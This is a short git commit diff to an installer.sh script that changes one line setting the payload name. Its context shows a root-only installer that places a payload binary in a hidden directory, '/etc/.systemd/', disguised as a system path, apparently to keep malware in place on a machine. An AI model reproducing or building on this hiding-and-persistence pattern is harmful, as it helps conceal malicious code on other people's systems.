1604714ff16069af2c9be3d3a3526440a8dfc8c1
Dylan Forwood <37117314+pyCity@users.noreply.github.com>
2019-02-03 10:26:01 -0600

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -22,7 +22,7 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 HIDDEN_DIR="/etc/.systemd/"           # Directory for binaries
-PAY_NAME="Zero"#$                     # Name of binary to installs (preferably .elf)
+PAY_NAME="Zero"#$1                    # Name of binary to installs (preferably .elf)
 PAYLOAD="${HIDDEN_DIR}${PAY_NAME}"    # Full path to payload
 
 
